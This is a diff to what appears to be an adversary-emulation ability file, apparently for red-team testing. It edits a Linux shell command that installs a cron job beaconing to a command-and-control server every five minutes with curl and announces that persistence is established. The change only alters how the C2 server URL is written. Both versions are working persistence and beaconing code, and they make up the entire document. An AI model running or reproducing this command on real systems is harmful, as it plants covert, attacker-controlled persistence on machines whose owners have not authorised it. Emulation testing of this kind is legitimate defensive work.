@@ -9,4 +9,4 @@
     linux:
       sh:
         command: |
-          C2_SERVER="#{server}"; CRON_CMD="*/5 * * * * curl -s http://$C2_SERVER:8888/beacon > /dev/null 2>&1"; (crontab -l 2>/dev/null; echo "$CRON_CMD") | crontab -; echo "[+] Persistence established via cron"; crontab -l
+          C2_SERVER="#{server}"; CRON_CMD="*/5 * * * * curl -s $C2_SERVER/beacon > /dev/null 2>&1"; (crontab -l 2>/dev/null; echo "$CRON_CMD") | crontab -; echo "[+] Persistence established via cron"; crontab -l
